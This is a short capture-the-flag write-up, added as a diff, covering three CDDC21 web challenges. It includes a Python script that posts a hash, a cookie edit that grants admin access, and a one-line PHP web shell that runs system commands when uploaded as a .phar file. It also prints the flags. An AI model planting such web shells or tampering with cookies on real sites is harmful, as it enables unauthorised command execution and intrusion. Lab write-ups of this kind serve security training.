@@ -1,0 +1,41 @@
+<h1>Web Takedown Episode 2 (Web)</h1>
+
+<h2>Quick</h2>
+
+<p>Python script to calculate and send the SHA-256 hash of a string.</p>
+
+<p>```python
+import requests
+import re
+import hashlib</p>
+
+<p>s = requests.Session()
+content = s.get("http://18.139.27.125/UMJVHRV5/")
+match = re.search(r"[A-Fa-f0-9]{32}", content.content.decode())</p>
+
+<p>hash<em>object = hashlib.sha256(match.group(0).encode())
+hex</em>dig = hash<em>object.hexdigest()
+myobj = {'hash': hex</em>dig, 'execute': ''}
+x = s.post("http://18.139.27.125/UMJVHRV5/", data=myobj)
+print(x.text)
+```</p>
+
+<p><code>CDDC21{!t_wAs-S0_fasT!}</code></p>
+
+<h2>Just a Session</h2>
+
+<p>Change the <code>aWFkbWlu</code> cookie from 0 to 1.</p>
+
+<p><code>CDDC21{I_Have_a_C00KIE_foR_Y0u}</code></p>
+
+<h2>Restrictions</h2>
+
+<p>We are given a file upload form. Using a webshell with a <code>.phar</code> extension, we can execute system commands.</p>
+
+<p><code>php
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></p>
+
+<p><code>CDDC21{s4F3_uPl04dZ}</code></p>
+
+<h3><a id="&#x2714;&#xFE0F;Break-it-Down-Crypto"></a></h3>
